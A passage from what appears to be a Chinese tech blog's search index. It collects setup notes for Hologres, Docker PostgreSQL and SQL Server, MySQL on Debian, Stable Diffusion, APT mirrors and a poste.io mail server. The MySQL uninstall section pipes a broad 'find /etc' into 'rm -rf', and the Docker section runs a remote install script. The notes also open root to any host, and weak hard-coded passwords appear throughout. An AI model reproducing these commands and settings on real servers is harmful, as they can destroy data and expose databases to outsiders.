在数据集成页面，在创建同步任务中，选择来源与去向数据源，单击开始创建。\n来源：选择MySQL。\n去向：选择Hologres。\n目标表映射 勾选github_public_event表，单击批量刷新映射。基于上述已创建的Hologres内部表，将目标Schema名改为hologres_dataset_github_event，目标表名改为hologres_github_event，单击完成配置。\n当结构迁移和全量初始化完成后，表示数据同步已成功，就可以登录Hologres进行实时数据分析。\n实时OLAP分析 SELECT repo_name, COUNT(*) AS events FROM hologres_dataset_github_event.hologres_github_event WHERE created_at \u0026gt;= now() - interval \u0026#39;1 day\u0026#39; GROUP BY repo_name ORDER BY events DESC LIMIT 5; 查询实时更新的过去24小时GitHub最活跃项⽬。\n","permalink":"https://qfsyso.github.io/posts/hologres-dataworks/","summary":"实时数仓Hologres Hologres是阿里云自研一站式实时数仓，统一数据平台架构，支持海量结构化/半结构化数据的实时写入、实时更新、实时加工、实时分析，支持标准SQL（兼容PostgreSQL协议），无缝对接主流BI工具，支持OLAP查询、即席分析、在线服务、向量计算多个场景，分析性能打破TPC-H世界记录，与MaxCompute、Flink、DataWorks深度融合，提供离在线一体化全栈数仓解决方案。\n大数据开发治理平台DataWorks DataWorks基于阿里云ODPS/EMR/CDP等大数据引擎，为数据仓库/数据湖/湖仓一体等解决方案提供统一的全链路大数据开发治理平台。作为阿里巴巴数据中台的建设者，DataWorks从2009年起不断沉淀阿里巴巴大数据建设方法论，同时与数万名政务/金融/零售/互联网/能源/制造等客户携手，助力产业数字化升级。\nDataV数据可视化 数据可视化DataV是阿里云数据可视化应用搭建平台，旨让更多的人看到数据可视化的魅力，帮助非专业的工程师通过图形化的界面轻松搭建专业水准的可视化应用，满足您会议展览、业务监控、风险预警、地理信息分析等多种业务的展示需求。\nHologres 64core VS ClickHouse 64core 在单表测试的13个查询中，11个查询Hologres比Clickhouse更快。 Clickhouse总耗时是Hologres的1.35倍。\n高性能实时写入与更新 通过Hologres Fixed Plan能力，实现高性能的实时写入与更新\nHologres Binlog:全链路的实时开发体验，简化数仓分层 通过Hologres Binl0g，结合Flink，可以实现全链路的实时开发体验，达到像Kafka、datahub同等的消息队列能力，简化数仓分层体验，增加数据复用能力。\nRuntime Filter:自动优化大小表Join效率 计算组(warehouse)实例:资源隔离、弹性、自动切流\nServerless Computing:提供大作业隔离与弹性处理 通过共享Serverless资源执行DML任务，保证大任务隔高与高可用，降低成本并提升性能。 同时支持设置单条SOL使用 Serverless的资源上限，支持设置使用Serverless资源的SOL优先级\n案例 小红书 ClickHouse Only 7天 乐元素:替换Hive+Presto构建高性能游戏运营分析平白 流量分析 开箱可用 性能比手写sql快10倍 节约成本 https://www.aliyun.com/activity/bigdata/hologres_cases\n电商漏斗模型分析 漏斗模型有助于企业识别在客户购买过程中的各个环节，通过优化漏斗的各个阶段来增加转化率，提升销售业绩。本案例将分析电商场景的漏斗模型、计算各环节的转化率。\n智慧城市人口财产主题分析 采集各个领域的数据进行整合和分析，使得城市管理更高效、服务更贴心。本案例以城市人口财产主题分析为背景，为您介绍DataWorks在智慧城市项目中的应用。\n视频个性化推荐(协同过滤) 协同过滤算法是一种用于个性化推荐的技术，它可以基于用户间的行为相似性或物品间的相似性为用户推荐物品。本案例将为您介绍在DataWorks中如何使用阿里云PAI的协同过滤算法实现视频的个性化推荐。\n实操 mysql -\u0026gt; hologres 创建专有网络VPC和交换机 192.168.0.0/16。 开通DataWorks 创建公网NAT\n创建Hologres表 登录Hologres控制台。 新建库，新建表\n-- 新建schema用于创建内表并导入数据 CREATE SCHEMA IF NOT EXISTS hologres_dataset_github_event; DROP TABLE IF EXISTS hologres_dataset_github_event.hologres_github_event; BEGIN; CREATE TABLE hologres_dataset_github_event.","title":"Hologres DataWorks"},{"content":"创建容器 docker run -id --name=postgresql -v postgre-data:/var/lib/postgresql/data -p 5432:5432 -e POSTGRES_PASSWORD=123456 -e LANG=C.UTF-8 postgres 进入 docker exec -it my-postgres psql -U postgres SELECT version(); create database test_db; CREATE TABLE test_table ( id SERIAL PRIMARY KEY, name VARCHAR(50) NOT NULL, age INTEGER ); INSERT INTO test_table (name, age) VALUES (\u0026#39;m\u0026#39;, 30); SELECT * FROM test_table; nodejs测试 // 引入 \u0026#39;pg\u0026#39; 模块 const { Client } = require(\u0026#39;pg\u0026#39;); // 设置数据库连接参数 const client = new Client({ user: \u0026#39;postgres\u0026#39;, host: \u0026#39;localhost\u0026#39;, database: \u0026#39;test_db\u0026#39;, password: \u0026#39;123456\u0026#39;, port: 5432, }); // 连接到数据库 client.connect() .then(() =\u0026gt; { console.log(\u0026#39;已连接到PostgreSQL数据库\u0026#39;); // 执行查询 return client.query(\u0026#39;SELECT NOW()\u0026#39;);// 获取当前时间 }) .then(res =\u0026gt; { console.log(\u0026#39;结果:\u0026#39;, res.rows); }) .catch(err =\u0026gt; { console.error(\u0026#39;错误:\u0026#39;, err.stack); }) .finally(() =\u0026gt; { // 关闭连接 client.end(); }); C# nuget Npgsql\n// PostgreSQL 数据库连接字符串 string connString = \u0026#34;Host=localhost;Port=5432;Username=postgres;Password=123456;Database=test_db\u0026#34;; using (var conn = new NpgsqlConnection(connString)) { try { // 打开数据库连接 conn.Open(); Console.WriteLine(\u0026#34;已连接到PostgreSQL数据库\u0026#34;); // 查询示例，获取当前时间 string sql = \u0026#34;SELECT NOW()\u0026#34;; using (NpgsqlCommand cmd = new NpgsqlCommand(sql, conn)) { // 执行查询并输出结果 var reader = cmd.ExecuteReader(); while (reader.Read()) { Console.WriteLine(\u0026#34;当前时间: \u0026#34; + reader.GetDateTime(0)); } } } catch (Exception ex) { Console.WriteLine(ex.ToString()); } } ","permalink":"https://qfsyso.github.io/posts/docker-postgresql/","summary":"创建容器 docker run -id --name=postgresql -v postgre-data:/var/lib/postgresql/data -p 5432:5432 -e POSTGRES_PASSWORD=123456 -e LANG=C.UTF-8 postgres 进入 docker exec -it my-postgres psql -U postgres SELECT version(); create database test_db; CREATE TABLE test_table ( id SERIAL PRIMARY KEY, name VARCHAR(50) NOT NULL, age INTEGER ); INSERT INTO test_table (name, age) VALUES (\u0026#39;m\u0026#39;, 30); SELECT * FROM test_table; nodejs测试 // 引入 \u0026#39;pg\u0026#39; 模块 const { Client } = require(\u0026#39;pg\u0026#39;); // 设置数据库连接参数 const client = new Client({ user: \u0026#39;postgres\u0026#39;, host: \u0026#39;localhost\u0026#39;, database: \u0026#39;test_db\u0026#39;, password: \u0026#39;123456\u0026#39;, port: 5432, }); // 连接到数据库 client.","title":"docker postgresql"},{"content":"背景知识 部署Stable Diffusion，内置模型库+常用插件+ControlNet。\n这是一项接近零基础的教程，其中并不会包含复杂的概念或者深奥的算法。换句话说，只要你稍有计算机基础，了解如何敲入命令，知道怎么使用浏览器打开网页，您就能很轻松的完成这个实验。\nAI生成内容的形式相当丰富，除了文字外，还可以进行绘画、作曲、演唱、编剧、设计等。最近热度非常高的Text to Image就是AI加持下非常时髦的一种图片创造方式。看看下面这些图片，你一定很难想象它们都是AI生成的吧。\n许多人可能觉得，使用AIGC有很高的门槛，普通人是很难入门的。其实不然，随着AI技术的快速发展以及众多开源项目的诞生，我们每个人都可以很轻松且廉价的使用到AIGC。谁能想到，在2018 年，人工智能生成的画作在佳士得拍卖价还高达43.25万美元，而时隔才数年，让AI为我们创作绘画已经成了人人触手可及的事情。\n在这些开源项目中，Stable Diffusion无疑是优秀生之一。Stable Diffusion是一种扩散模型（Diffusion Model）的变体，称为“潜在扩散模型”（Latent Diffusion Model），由CompVis、Stability AI和LAION的研究人员和工程师创建。\n它使用来自LAION-5B数据库子集的图像进行训练。使用这个模型，可以生成包括人脸在内的任何图像，因为有开源的预训练模型，所以我们也可以在自己的机器上运行它。Stable Diffusion能够根据我们提供的一些提示词以及可以调整的部分参数，通过模型计算生成一张不错的图片。\n函数计算FC\n函数计算（Function Compute）是一个事件驱动的全托管 Serverless 计算服务，您无需管理服务器等基础设施，只需编写代码并上传，函数计算会为您准备好计算资源，并以弹性、可靠的方式运行代码。\nSD1.5 动漫风格 真人风格 轻量版 TensorRT 艺术字\n提示词就是生成图片的依据，既可以是描述需要生成内容的词，例如girl, sunset, forest等； 也可以是用于是描述图像属性的词，例如best quality, beautiful, masterpiece等。我们甚至可以通过提示词选择图片生成的视角、光线、画风；人物的姿势、着装、表情、背景的内容等。\n建议加上画风描述词，让您的图片更加美观，如：Cyberpunk（赛博朋克），shinkai makoto（新海诚），Ghibli Studio（吉卜力），Paul Gauguin（梵高）等等\nSD提示词 qwen 你是一个优秀的导演和Stable Difusion专家。接下来我们要共同完成一部电视剧的AI创作，请你根据我给你的场景，尽可能详细地描述场景的画面，并给出制作这个场累的Stable Difusion 英语提示词，所有提示词中都要加上“画面比例16:9,超写实，高质量，\u0026ldquo;的英语，场景描述不少于200字，提示词不少于30个单词。如果你明白了，请回复“明白\u0026rdquo;，然后我将开始发给你场景。场景一:一个12岁的少年百里东君在一棵桃花树上躺着闭目养神，手上拿着一个白玉酒杯，穿着浅蓝色的长袍，带一点点花纹样式，腰间佩着长剑，阳光透过树叶酒在他的脸上，远，落雪飞，桃花盛开，显示小河，远处的凉亭、茅屋、草坪。\nprompt: Prompt for Stable Diffusion: \u0026ldquo;Scene ratio 16:9, hyper-realistic, high-quality. A 12-year-old boy in ancient Chinese clothing, wearing a light blue robe with intricate patterns, lying on a branch of a peach blossom tree. He holds a white jade wine cup in his hand and has a long sword at his waist. Snowflakes and peach blossoms mix together as they fall, while sunlight filters through the branches. There\u0026rsquo;s a small river, a pavilion, and a thatched cottage in the background, all set against a backdrop of green grass and a serene landscape.\u0026rdquo;\n采样步数40 高度1980 宽度1080 提示词引导 高 种子1 反向提示词 写入不要什么\n扩展 高级定制 lora模型 https://www.liblib.art/\n我们可以从LiblibAI下载lora模型到本地，然后把它上传到/mnt/auto/sd/models/Lora/目录。\n前往LiblibAI，进行基础模型的筛选。\n拓展 ControlNet使用 ControlNet包含插件和模型两部分。为了降低费用消耗，建议先下载到本地后，通过admin上传至NAS。\nControlNet插件地址。\n项目地址：https://github.com/Mikubill/sd-webui-controlnet。\n进入页面后，单击右侧的Code，并选择Download ZIP下载插件代码。\n","permalink":"https://qfsyso.github.io/posts/stable-diffusion/","summary":"背景知识 部署Stable Diffusion，内置模型库+常用插件+ControlNet。\n这是一项接近零基础的教程，其中并不会包含复杂的概念或者深奥的算法。换句话说，只要你稍有计算机基础，了解如何敲入命令，知道怎么使用浏览器打开网页，您就能很轻松的完成这个实验。\nAI生成内容的形式相当丰富，除了文字外，还可以进行绘画、作曲、演唱、编剧、设计等。最近热度非常高的Text to Image就是AI加持下非常时髦的一种图片创造方式。看看下面这些图片，你一定很难想象它们都是AI生成的吧。\n许多人可能觉得，使用AIGC有很高的门槛，普通人是很难入门的。其实不然，随着AI技术的快速发展以及众多开源项目的诞生，我们每个人都可以很轻松且廉价的使用到AIGC。谁能想到，在2018 年，人工智能生成的画作在佳士得拍卖价还高达43.25万美元，而时隔才数年，让AI为我们创作绘画已经成了人人触手可及的事情。\n在这些开源项目中，Stable Diffusion无疑是优秀生之一。Stable Diffusion是一种扩散模型（Diffusion Model）的变体，称为“潜在扩散模型”（Latent Diffusion Model），由CompVis、Stability AI和LAION的研究人员和工程师创建。\n它使用来自LAION-5B数据库子集的图像进行训练。使用这个模型，可以生成包括人脸在内的任何图像，因为有开源的预训练模型，所以我们也可以在自己的机器上运行它。Stable Diffusion能够根据我们提供的一些提示词以及可以调整的部分参数，通过模型计算生成一张不错的图片。\n函数计算FC\n函数计算（Function Compute）是一个事件驱动的全托管 Serverless 计算服务，您无需管理服务器等基础设施，只需编写代码并上传，函数计算会为您准备好计算资源，并以弹性、可靠的方式运行代码。\nSD1.5 动漫风格 真人风格 轻量版 TensorRT 艺术字\n提示词就是生成图片的依据，既可以是描述需要生成内容的词，例如girl, sunset, forest等； 也可以是用于是描述图像属性的词，例如best quality, beautiful, masterpiece等。我们甚至可以通过提示词选择图片生成的视角、光线、画风；人物的姿势、着装、表情、背景的内容等。\n建议加上画风描述词，让您的图片更加美观，如：Cyberpunk（赛博朋克），shinkai makoto（新海诚），Ghibli Studio（吉卜力），Paul Gauguin（梵高）等等\nSD提示词 qwen 你是一个优秀的导演和Stable Difusion专家。接下来我们要共同完成一部电视剧的AI创作，请你根据我给你的场景，尽可能详细地描述场景的画面，并给出制作这个场累的Stable Difusion 英语提示词，所有提示词中都要加上“画面比例16:9,超写实，高质量，\u0026ldquo;的英语，场景描述不少于200字，提示词不少于30个单词。如果你明白了，请回复“明白\u0026rdquo;，然后我将开始发给你场景。场景一:一个12岁的少年百里东君在一棵桃花树上躺着闭目养神，手上拿着一个白玉酒杯，穿着浅蓝色的长袍，带一点点花纹样式，腰间佩着长剑，阳光透过树叶酒在他的脸上，远，落雪飞，桃花盛开，显示小河，远处的凉亭、茅屋、草坪。\nprompt: Prompt for Stable Diffusion: \u0026ldquo;Scene ratio 16:9, hyper-realistic, high-quality. A 12-year-old boy in ancient Chinese clothing, wearing a light blue robe with intricate patterns, lying on a branch of a peach blossom tree.","title":"stable diffusion"},{"content":"1.更新软件包列表 运行 apt update 命令来完成。\nsudo apt update\n2. 安装MySQL APT配置工具 安装MySQL\nwget https://dev.mysql.com/get/mysql-apt-config_0.8.32-1_all.deb apt install gnupg dpkg -i mysql-apt-config_0.8.32-1_all.deb apt update 3. 安装MySQL服务器 apt install mysql-server 4 . 更新软件包列表 以便APT可以识别新添加的MySQL仓库。\nsudo apt update 5. 启动MySQL服务 启动MySQL服务并设置它在系统启动时自动启动。\nsudo systemctl start mysql sudo systemctl enable mysql 6. 登录MySQL服务器 使用root用户登录到MySQL服务器。\nmysql -u root -p 输入密码后，您将进入MySQL命令行。使用 exit 命令退出。\nALTER USER \u0026#39;myuser\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;new_password\u0026#39;; 可选\n7.测试 CREATE DATABASE mydatabase; Query OK, 1 row affected (0.00 sec)\nCREATE USER \u0026#39;myuser\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;mypassword\u0026#39;; GRANT ALL PRIVILEGES ON mydatabase.* TO \u0026#39;myuser\u0026#39;@\u0026#39;localhost\u0026#39;; FLUSH PRIVILEGES; Use mydatabase; CREATE TABLE `Test` ( `id` INT NOT NULL AUTO_INCREMENT, `name` VARCHAR(100) NOT NULL, `age` INT NOT NULL, PRIMARY KEY (`id`) ) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4; Insert into Test(name,age) value (\u0026#39;zs\u0026#39;,17); SELECT * FROM Test python mysql test\n#pip install mysql-connector-python import mysql.connector from mysql.connector import Error def create_connection(host_name, user_name, user_password, db_name): connection = None try: connection = mysql.connector.connect( host=host_name, user=user_name, passwd=user_password, database=db_name ) print(\u0026#34;Connection to MySQL DB successful\u0026#34;) except Error as e: print(f\u0026#34;The error \u0026#39;{e}\u0026#39; occurred\u0026#34;) return connection def execute_read_query(connection, query): cursor = connection.cursor() result = None try: cursor.execute(query) result = cursor.fetchall() return result except Error as e: print(f\u0026#34;The error \u0026#39;{e}\u0026#39; occurred\u0026#34;) # Replace with your actual credentials 3306 host = \u0026#34;39.108.xxxxx\u0026#34; user = \u0026#34;root\u0026#34; password = \u0026#34;xx.zxcv\u0026#34; database = \u0026#34;xx\u0026#34; connection = create_connection(host, user, password, database) query = \u0026#34;SELECT * FROM test LIMIT 5\u0026#34; # Replace \u0026#39;your_table\u0026#39; with the name of your table results = execute_read_query(connection, query) for result in results: print(result) # Remember to close the connection when you\u0026#39;re done if connection.is_connected(): connection.close() print(\u0026#34;MySQL connection is closed\u0026#34;) 8. 重启MySQL服务 保存并关闭文件后，重新启动MySQL服务以应用更改。\n#restart sudo systemctl restart mysql #停止 sudo systemctl stop mysql #status systemctl status mysql 查看状态 9. 备份 mysql -u 用户名 -p 数据库名 \u0026lt; 文件路径.sql mysql -u 用户名 -p -e \u0026#34;CREATE DATABASE mydatabase;\u0026#34; mysql -u 用户名 -p mydatabase \u0026lt; /path/to/backup.sql 10.docker docker run --name myadmin -d -e PMA_ARBITRARY=1 -p 12121:80 phpmyadmin err 1130 (HY000): Host Host is not allowed to connect to this MySQL server\nmysql\u0026gt;use mysql; //选中数据库\nmysql\u0026gt;select \u0026lsquo;host\u0026rsquo; from user where user=\u0026lsquo;root\u0026rsquo;; //查看该表的值\nmysql\u0026gt;update user set host = \u0026lsquo;%\u0026rsquo; where user =\u0026lsquo;root\u0026rsquo;; //修改\nmysql\u0026gt;flush privileges; //刷新数据库\n检查MySQL服务器的配置文件（如 my.cnf 或 my.ini），确保没有禁止远程连接的相关设置， bind-address 参数通常需要设置为 0.0.0.0 或者指定的公网IP地址以接受远程连接。\nmysql卸载 卸载 \u0026ndash;卸载当前MySQL实例：\nsudo apt-get remove --purge mysql-server mysql-client mysql-common sudo apt-get autoremove sudo apt-get autoclean 删除MySQL的数据目录（默认为/var/lib/mysql）：\nsudo rm -rf /var/lib/mysql 清理残留的配置文件：\nsudo find /etc -name \u0026#34;mysql*\u0026#34; | sudo xargs rm -rf 更新包管理器的索引：\nsudo apt-get update 重新安装MySQL服务器：\nsudo apt-get install mysql-server +++sql 远程错误 Host is not allowed to connect to this MySQL server 通过远程客户端访问MySQL服务器时会遇到“Host is not allowed to connect to this MySQL server”的错误提示。\n原因 MySQL服务器当前配置不允许来自特定主机的连接尝试。\n解决方法 允许远程主机访问MySQL服务器，按照以下步骤操作：\n登录本地MySQL服务器： 以管理员身份登录到MySQL服务器，输入MySQL root用户的密码：\nmysql -u root -p 选择MySQL数据库： 登录成功后，切换到MySQL系统数据库：\nuse mysql; 更新用户权限： 修改root用户的host字段（或其他需要远程访问的用户），允许任意远程主机（用 ‘%’ 表示）进行连接，但这一步可能涉及到安全风险，建议只针对需要远程访问的特定用户设置具体的远程IP地址，而不是使用通配符 % 开启所有远程访问：\nupdate user set host = \u0026#39;%\u0026#39; where user = \u0026#39;root\u0026#39;; 刷新权限： flush privileges; 防火墙设置： 确保服务器的防火墙规则允许MySQL服务端口（默认为3306）上的入站流量。\nMySQL配置文件： 检查MySQL服务器的配置文件（如 my.cnf 或 my.ini），确保没有禁止远程连接的相关设置， bind-address 参数通常需要设置为 0.0.0.0 或者指定的公网IP地址以接受远程连接。\n使用命令行备份特定表 在MySQL中，如果您想要备份特定的表而不是整个数据库，可以使用mysqldump工具来完成。以下是具体的操作步骤：\n假设您的数据库名为mydatabase，需要备份的表为table1和table2。\n命令格式：\nmysqldump -u [username] -p[password] [database_name] [table_name1] [table_name2] \u0026gt; [output_file.sql] 示例：\nmysqldump -u root -p mydatabase table1 table2 \u0026gt; backup.sql -u root：指定用户名为root。 -p：提示输入密码（为了安全，密码不会直接显示在命令行中）。 mydatabase：要备份的数据库名。 table1 table2：需要备份的表名。\nbackup.sql：将输出重定向到backup.sql文件中。\n注意事项 确保您有足够的权限访问指定的数据库和表。 如果您的数据库或表名包含特殊字符或者空格，请确保用引号括起来。 在生产环境中执行此操作前，最好先在一个测试环境中测试命令，以避免任何可能的数据丢失或错误。 考虑定期检查备份文件的完整性和可恢复性。\nmysqldump -u root -p mydatabase table1 table2 \u0026gt; backup.sql 使用 mysqldump 命令备份数据库中的特定表后，可以通过 mysql 命令来恢复这些表的数据。以下是还原命令的基本格式：\nmysql -u root -p mydatabase \u0026lt; backup.sql 在这个命令中：\n-u root 指定MySQL的用户名为root。-p 表示接下来会提示输入该用户的密码。mydatabase 是要还原数据的目标数据库名。\u0026lt; backup.sql 表示将备份文件 backup.sql 中的内容导入到指定的数据库中。\n在执行上述命令前，请确保：\n目标数据库 mydatabase 已经存在。如果不存在，需要先创建它：\nCREATE DATABASE mydatabase; 有足够的权限去操作这个数据库。如果不确定是否有足够的权限，可以联系数据库管理员或者使用具有足够权限的账户。备份文件 backup.sql 的路径是正确的，并且文件是可访问的。\n另外，如果在恢复过程中遇到错误，例如因为表已经存在而无法导入数据，可以选择先删除这些表再进行恢复，或者在导入之前修改SQL文件，以避免这些冲突。如果希望覆盖已存在的表，可以在导入前删除它们，或者使用 \u0026ndash;force 参数来忽略错误：\nmysql -u root -p --force mydatabase \u0026lt; backup.sql 请注意，使用 \u0026ndash;force 参数可能会导致数据丢失或损坏，因此请谨慎使用。在进行任何数据操作之前，建议再次确认备份文件的正确性和完整性。\n修改MySQL端口的步骤： 停止MySQL服务： 首先，需要停止MySQL服务以确保在修改配置文件时不会有冲突。\nsudo systemctl stop mysql 备份配置文件： 在修改配置文件之前，建议备份原始的配置文件。\nsudo cp /etc/mysql/my.cnf /etc/mysql/my.cnf.bak 编辑配置文件： 使用文本编辑器打开MySQL的主配置文件my.cnf。这个文件通常位于/etc/mysql/目录下。\nsudo nano /etc/mysql/my.cnf 或者使用其他喜欢的编辑器。\n修改端口： 在my.cnf文件中找到[mysqld]部分，并添加或修改port指令，将其设置为想要使用的端口号。例如，如果想将端口修改为3307，可以这样设置：\n[mysqld] port = 3307 确保这个端口号没有被其他服务占用。\n保存并退出编辑器： 如果使用的是nano，可以按Ctrl + X，然后按Y保存更改，最后按Enter退出。\n重启MySQL服务： 修改配置文件后，需要重启MySQL服务以使更改生效。\nsudo systemctl start mysql 检查端口： 使用netstat命令检查MySQL服务是否正在监听新的端口。\nsudo netstat -tulnp | grep mysql 应该能看到MySQL正在监听指定的新端口。\n更新防火墙规则 ufw ： 如果的Debian系统使用了防火墙，确保更新防火墙规则以允许流量通过新的MySQL端口。\nsudo ufw allow 3307/tcp ","permalink":"https://qfsyso.github.io/posts/debian-mysql/","summary":"1.更新软件包列表 运行 apt update 命令来完成。\nsudo apt update\n2. 安装MySQL APT配置工具 安装MySQL\nwget https://dev.mysql.com/get/mysql-apt-config_0.8.32-1_all.deb apt install gnupg dpkg -i mysql-apt-config_0.8.32-1_all.deb apt update 3. 安装MySQL服务器 apt install mysql-server 4 . 更新软件包列表 以便APT可以识别新添加的MySQL仓库。\nsudo apt update 5. 启动MySQL服务 启动MySQL服务并设置它在系统启动时自动启动。\nsudo systemctl start mysql sudo systemctl enable mysql 6. 登录MySQL服务器 使用root用户登录到MySQL服务器。\nmysql -u root -p 输入密码后，您将进入MySQL命令行。使用 exit 命令退出。\nALTER USER \u0026#39;myuser\u0026#39;@\u0026#39;localhost\u0026#39; IDENTIFIED BY \u0026#39;new_password\u0026#39;; 可选\n7.测试 CREATE DATABASE mydatabase; Query OK, 1 row affected (0.","title":"debian mysql"},{"content":"debian更换apt源 在Debian系统中更换APT源，你需要编辑/etc/apt/sources.list文件，将其中的现有源地址替换为新的源地址。以下是一个基本的步骤和示例：\n打开终端。\n使用文本编辑器编辑sources.list文件，例如使用nano或vim：\nsudo nano /etc/apt/sources.list 或者\nsudo vim /etc/apt/sources.list 注释掉或删除旧的源地址行（在行首加#可以将其注释掉）。\n添加新的源地址。例如，Debian官方的非US源，可以添加以下行：\ndeb http://deb.debian.org/debian bullseye main contrib non-free deb-src http://deb.debian.org/debian bullseye main contrib non-free 这里的bullseye是Debian的代号，例如bookworm、buster等。\ndeb http://mirrors.aliyun.com/debian/ stable main contrib non-free 保存文件并退出编辑器。\n更新APT源：\nsudo apt update 升级已安装的包：\nsudo apt upgrade 请确保你使用的源与你的Debian版本兼容。可信的源可以保证软件包的安全和可靠性。\n","permalink":"https://qfsyso.github.io/posts/debian-apt-update/","summary":"debian更换apt源 在Debian系统中更换APT源，你需要编辑/etc/apt/sources.list文件，将其中的现有源地址替换为新的源地址。以下是一个基本的步骤和示例：\n打开终端。\n使用文本编辑器编辑sources.list文件，例如使用nano或vim：\nsudo nano /etc/apt/sources.list 或者\nsudo vim /etc/apt/sources.list 注释掉或删除旧的源地址行（在行首加#可以将其注释掉）。\n添加新的源地址。例如，Debian官方的非US源，可以添加以下行：\ndeb http://deb.debian.org/debian bullseye main contrib non-free deb-src http://deb.debian.org/debian bullseye main contrib non-free 这里的bullseye是Debian的代号，例如bookworm、buster等。\ndeb http://mirrors.aliyun.com/debian/ stable main contrib non-free 保存文件并退出编辑器。\n更新APT源：\nsudo apt update 升级已安装的包：\nsudo apt upgrade 请确保你使用的源与你的Debian版本兼容。可信的源可以保证软件包的安全和可靠性。","title":"debian apt update"},{"content":"ittools https://github.com/CorentinTh/it-tools/tree/main\npnpm https://www.pnpm.cn/installation#%E4%BD%BF%E7%94%A8-npm-%E5%AE%89%E8%A3%85\nProject Setup pnpm install Compile and Hot-Reload for Development pnpm dev Type-Check, Compile and Minify for Production pnpm build Run Unit Tests with Vitest pnpm test Lint with ESLint pnpm lint Create a new tool To create a new tool, there is a script that generate the boilerplate of the new tool, simply run:\npnpm run script:create:tool my-tool-name docker run docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest ","permalink":"https://qfsyso.github.io/posts/docker-ittools/","summary":"ittools https://github.com/CorentinTh/it-tools/tree/main\npnpm https://www.pnpm.cn/installation#%E4%BD%BF%E7%94%A8-npm-%E5%AE%89%E8%A3%85\nProject Setup pnpm install Compile and Hot-Reload for Development pnpm dev Type-Check, Compile and Minify for Production pnpm build Run Unit Tests with Vitest pnpm test Lint with ESLint pnpm lint Create a new tool To create a new tool, there is a script that generate the boilerplate of the new tool, simply run:\npnpm run script:create:tool my-tool-name docker run docker run -d --name it-tools --restart unless-stopped -p 8080:80 corentinth/it-tools:latest ","title":"docker ittools"},{"content":"docker docker run -d -p 25:25 -p 80:80 -p 110:110 -p 143:143 -p 443:443 -p 587:587 -p 993:993 -p 995:995 -v /etc/localtime:/etc/localtime:ro -v /data/poste/data:/data --name \u0026#34;PosteServ\u0026#34; -h \u0026#34;mx.xxxxxx.com\u0026#34; -t analogic/poste.io 解析 mx A记录 开放25 80 110 143 443 587 993 995端口\n#/srv/poste/data为Poste数据存放文件夹，如用户数据库、电子邮件、日志，方便备份。\n443为web控制台端口 ip端口访问 https://ip\n访问 添加管理邮箱 First poste.io configuration There is no \u0026ldquo;server.ini\u0026rdquo; in your data folder, we will try create one. You can update it later in your data folder.\n创建邮箱 adm\nhttps://ip/webmail 登录邮箱\nAPI /admin/api/doc api\n","permalink":"https://qfsyso.github.io/posts/email-server/","summary":"docker docker run -d -p 25:25 -p 80:80 -p 110:110 -p 143:143 -p 443:443 -p 587:587 -p 993:993 -p 995:995 -v /etc/localtime:/etc/localtime:ro -v /data/poste/data:/data --name \u0026#34;PosteServ\u0026#34; -h \u0026#34;mx.xxxxxx.com\u0026#34; -t analogic/poste.io 解析 mx A记录 开放25 80 110 143 443 587 993 995端口\n#/srv/poste/data为Poste数据存放文件夹，如用户数据库、电子邮件、日志，方便备份。\n443为web控制台端口 ip端口访问 https://ip\n访问 添加管理邮箱 First poste.io configuration There is no \u0026ldquo;server.ini\u0026rdquo; in your data folder, we will try create one. You can update it later in your data folder.","title":"Email Server"},{"content":"docker curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 查看架构\nuname -m 安装 docker run -e \u0026#34;ACCEPT_EULA=Y\u0026#34; -e \u0026#34;SA_PASSWORD=Qq123123.\u0026#34; -e \u0026#34;TZ=Asia/Shanghai\u0026#34; -p 1433:1433 --name sqlserver2022 -d mcr.microsoft.com/mssql/server:2022-latest 开放端口 1433\n进入容器\ndocker exec -it sqlserver2022 /bin/bash 使用navicat test sa Qq123123. 测试连接\nSQL测试\nCREATE DATABASE mydb; GO USE mydb; GO CREATE TABLE Users ( UserId INT PRIMARY KEY IDENTITY(1,1), UserName NVARCHAR(50) NOT NULL ); GO INSERT INTO Users (UserName) VALUES (\u0026#39;zs\u0026#39;); INSERT INTO Users (UserName) VALUES (\u0026#39;ls\u0026#39;); INSERT INTO Users (UserName) VALUES (\u0026#39;w5\u0026#39;); GO SELECT * FROM Users; GO BACKUP USE master; GO BACKUP DATABASE mydb TO DISK = \u0026#39;mydblog.bak\u0026#39; WITH COMPRESSION, INIT, STATS=5; GO RESTORE update users set username = \u0026#39;zsss1\u0026#39; where userid= 1; go select * from users; go USE master; GO -- 检查数据库是否存在，如果存在则删除 IF EXISTS (SELECT name FROM sys.databases WHERE name = \u0026#39;mydb\u0026#39;) BEGIN DROP DATABASE mydb; END GO -- 还原数据库 RESTORE DATABASE mydb FROM DISK = \u0026#39;mydblog.bak\u0026#39; GO if restore err SET RECOVERY SIMPL\nUSE[master] GO ALTER DATABASE mydb SET RECOVERY SIMPLE WITH NO_WAIT GO ALTER DATABASE mydb SET RECOVERY SIMPLE --简单模式 GO RESTORE DATABASE mydb FROM DISK = \u0026#39;mydblog.bak\u0026#39; GO ALTER DATABASE mydb SET RECOVERY FULL WITH NO_WAIT GO ALTER DATABASE mydb SET RECOVERY FULL --还原为完全模式 GO use mydb go select * from users; go bak file var lib docker /var/lib/docker/overlay2/c3753774b8f233196f80cb43e0b38ff0e1d2600e6d6f48e10e9c472ff90b4d81/merged/var/opt/mssql/data/mydblog.bak /var/lib/docker/overlay2/c3753774b8f233196f80cb43e0b38ff0e1d2600e6d6f48e10e9c472ff90b4d81/diff/var/opt/mssql/data/mydblog.bak ","permalink":"https://qfsyso.github.io/posts/debian-docker-mssql/","summary":"docker curl -fsSL https://get.docker.com -o get-docker.sh sudo sh get-docker.sh 查看架构\nuname -m 安装 docker run -e \u0026#34;ACCEPT_EULA=Y\u0026#34; -e \u0026#34;SA_PASSWORD=Qq123123.\u0026#34; -e \u0026#34;TZ=Asia/Shanghai\u0026#34; -p 1433:1433 --name sqlserver2022 -d mcr.microsoft.com/mssql/server:2022-latest 开放端口 1433\n进入容器\ndocker exec -it sqlserver2022 /bin/bash 使用navicat test sa Qq123123. 测试连接\nSQL测试\nCREATE DATABASE mydb; GO USE mydb; GO CREATE TABLE Users ( UserId INT PRIMARY KEY IDENTITY(1,1), UserName NVARCHAR(50) NOT NULL ); GO INSERT INTO Users (UserName) VALUES 